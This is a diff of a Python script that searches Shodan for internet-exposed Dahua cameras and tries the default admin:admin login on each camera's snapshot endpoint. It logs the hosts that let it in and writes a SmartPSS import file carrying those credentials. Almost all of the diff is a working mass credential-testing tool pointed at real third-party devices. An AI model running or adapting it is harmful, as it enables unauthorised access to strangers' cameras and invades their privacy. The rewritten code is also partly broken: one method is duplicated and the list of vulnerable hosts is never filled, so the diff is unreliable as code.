@@ -1,128 +1,144 @@
+import os
+import argparse
 import requests
 import shodan
-import argparse
-from secrets import *
+import concurrent.futures
+import sqlite3
+import logging
+import queue
+import threading
+from itertools import islice
 
-api = shodan.Shodan(SHODAN_API_KEY)
+class DahuaWebCrawler:
+    def __init__(self, db_file):
+        self.SHODAN_API_KEY = os.getenv('SHODAN_API_KEY')
+        self.api = shodan.Shodan(self.SHODAN_API_KEY)
 
-iplist = []
-vulnlist = []
+        self.conn = sqlite3.connect(db_file)
+        self.cursor = self.conn.cursor()
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS IPs (
+                ip TEXT PRIMARY KEY,
+                status TEXT
+            )
+        ''')
+        self.vulnlist = []   # Initialize vulnlist here
+        # Create queue for database writes
+        self.db_queue = queue.Queue()
 
-parser = argparse.ArgumentParser(description='Dahua Webcrawler / Vulnerability tester')
-parser.add_argument("--count", default=100, type=int, help="Amount of hosts to be audited. Integer input only")
-args = parser.parse_args()
-am = args.count
+        # Start db write thread
+        self.db_thread = threading.Thread(target=self.db_write_thread)
+        self.db_thread.start()
+        logging.basicConfig(filename='webcrawler.log', level=logging.INFO,
+                            format='%(asctime)s - %(levelname)s - %(message)s')
 
+    def get_addresses(self, amount, query):
+        return [str(banner['ip_str']) for banner in islice(self.api.search_cursor(query), amount)]
+    
+    def build_link(self, ip):
+        return 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
 
-# Make pretty colors :)
-def pryellow(skk): print("\033[93m {}\033[00m".format(skk))
+    def is_request_successful(self, link):
+        try:
+            response = requests.get(link, verify=False, timeout=3)
+            return response.status_code == 200
+        except requests.exceptions.RequestException:
+            return False
 
+    def save_vulnerable_ips(self, vulnlist, filename='./list.txt'):
+        with open(filename, 'w') as file:
+            file.writelines(f'{ip}\n' for ip in vulnlist)
 
-def prred(skk): print("\033[91m {}\033[00m".format(skk))
+    def gen_device(self, vulnlist, filename='./devices.txt'):
+        with open(filename, 'w') as file:
+            file.write('<?xml version="1.0" encoding="UTF-8"?>\n')
+            file.write('<DeviceManager version="2.0">\n')
+            for i, vuln in enumerate(vulnlist):
+                file.write(f'<Device name="Webcrawler{i}" domain="{vuln}" port="37777" username="admin" password="admin" protocol="1" connect="0" />\n')
+            file.write('</DeviceManager>\n')
 
+    def percentage(self, vuln, total):
+        return (vuln / total) * 100 if total != 0 else 0
 
-def prcyan(skk): print("\033[96m {}\033[00m".format(skk))
+    def create_db(self, db_name='results.db'):
+        self.conn = sqlite3.connect(db_name)
+        self.cursor = self.conn.cursor()
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS IPs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                ip TEXT UNIQUE NOT NULL,
+                status TEXT NOT NULL DEFAULT 'unchecked'
+            )
+        ''')
+        self.conn.commit()
 
+    def db_write_thread(self):
+        while True:
+            ip, status = self.db_queue.get()
+            if ip is None:
+                # None is our signal to stop the thread
+                break
+            self.save_to_db(ip, status)
 
-def prgreen(skk): print("\033[92m {}\033[00m".format(skk))
+    def save_to_db(self, ip, status):
+        try:
+            self.cursor.execute('''
+                INSERT INTO IPs (ip, status) VALUES (?, ?)
+                ON CONFLICT(ip) DO UPDATE SET status=excluded.status
+            ''', (ip, status))
+            self.conn.commit()
+        except sqlite3.Error as e:
+            logging.error(f'Database error: {e}')
 
-
-# Gets available Dahua Hosts from search query
-def getaddresses(amount, query):
-    limit = amount
-    counter = 0
-    for banner in api.search_cursor(query):
-        ip = str(banner['ip_str'])
-        print(ip)
-        # city = str(banner['location'])
-        iplist.append(ip)
-        counter += 1
-        if counter >= limit:
-            break
-    return iplist
-
-
-# Generates link to which the request is sent, asking for a snapshot of first available channel using standard login
-# credentials.
-def linkbuilder():
-    linklist = []
-    for ip in iplist:
-        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
-        linklist.append(str(link))
-    return linklist
-
-
-# Makes request call to Dahua Product API, asking for a snapshot of first channel available
-# If request is succesful (HTML code 200), True is returned for vulnerable with standard login credentials.
-def request(link):
-    try:
-        response = requests.get(link, verify=False, timeout=3)
-        if response.status_code == 200:
-            return True
-    except:
-        return False
-        pass
-
-
-# Saves output (vulnerable IP's) to list.txt
-def save():
-    with open('./list.txt', 'w') as filehandle:
-        for vuln in vulnlist:
-            print('writing to file')
-            filehandle.write('%s\n' % vuln)
-
-
-# Creates device.xml template to be imported for SmartPSS
-def gendevice():
-    firstline = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
-    secondline = "<DeviceManager version=\"2.0\">"
-    lastline = "</DeviceManager>"
-    with open('./devices.txt', 'w') as filehandle:
-        filehandle.write('%s\n' % firstline)
-        filehandle.write('%s\n' % secondline)
-        for vuln in vulnlist:
-            nmbr = vulnlist.index(vuln)
-            newdev = "<Device name=\"Webcrawler" + str(nmbr) + "\"" + " domain=" + "\"" + vuln + "\"" + " port=\"37777" \
-                                                                                                        "\" " \
-                                                                                                        "username" \
-                                                                                                        "=\"admin\" " \
-                                                                                                        "password" \
-                                                                                                        "=\"admin\" " \
-                                                                                                        "protocol=\"1" \
-                                                                                                        "\" " \
-                                                                                                        "connect=\"0" \
-                                                                                                        "\" /> "
-            filehandle.write('%s\n' % newdev)
-        filehandle.write('%s\n' % lastline)
-
-
-# You know what this does...
-def percentage(vuln, total):
-    try:
-        return (vuln / total) * 100
-    except ZeroDivisionError:
-        return 0
+    def save_to_db(self, ip, status):
+        try:
+            self.cursor.execute('''
+                INSERT INTO IPs (ip, status) VALUES (?, ?)
+                ON CONFLICT(ip) DO UPDATE SET status=excluded.status
+            ''', (ip, status))
+            self.conn.commit()
+        except sqlite3.Error as e:
+            logging.error(f'Database error: {e}')
 
 
-def run(amount, query):
-    getaddresses(amount, str(query))
-    count = 0
-    for ip in iplist:
-        count += 1
-        perc = ("%.2f" % (percentage(len(vulnlist), count)))
-        link = 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'
-        prcyan("trying: " + link)
-        pryellow("Request number: " + str(count) + " | Amount vulnerable: " + str(len(vulnlist)) + "| Percentage "
-                                                                                                   "vulnerable: " +
-                 str(perc) + "%")
-        if request(link):
-            prgreen('Succes!')
-            vulnlist.append(ip)
-        else:
-            prred("Fail!")
-    return vulnlist
-    print(save())
+    def close_db(self):
+        self.conn.close()
+
+    def run(self, amount, query):
+        try:
+            self.iplist = self.get_addresses(amount, query)
+
+            # Store all IPs in the database as unchecked
+            for ip in self.iplist:
+                self.save_to_db(ip, 'unchecked')
+
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                futures = {executor.submit(self.is_request_successful, self.build_link(ip)): ip for ip in self.iplist}
+                for future in concurrent.futures.as_completed(futures):
+                    ip = futures[future]
+                    try:
+                        if future.result():
+                            logging.info(f'Success on IP: {ip}')
+                            self.db_queue.put((ip, 'vulnerable'))
+                        else:
+                            logging.info(f'Fail on IP: {ip}')
+                            self.db_queue.put((ip, 'not_vulnerable'))
+                    except Exception as exc:
+                        logging.error(f'An error occurred with IP {ip}: {exc}')
+
+        except KeyboardInterrupt:
+            logging.warning('Interrupted by user')
+        finally:
+            # Signal db write thread to stop and wait for it to finish
+            self.db_queue.put((None, None))
+            self.db_thread.join()
+
+            self.conn.close()
+            logging.info('Database connection closed')
+
+        return self.vulnlist
+    
 
 if __name__ == "__main__":
-    print(run(am, "Dahua \"server: Dahua Rtsp Server\""))
-    gendevice()
+    crawler = DahuaWebCrawler('crawler.db')  # The argument is the name of the SQLite database file.
+    crawler.run(10, "Dahua \"server: Dahua Rtsp Server\"")  # Parameters: amount of hosts to audit, and the search query
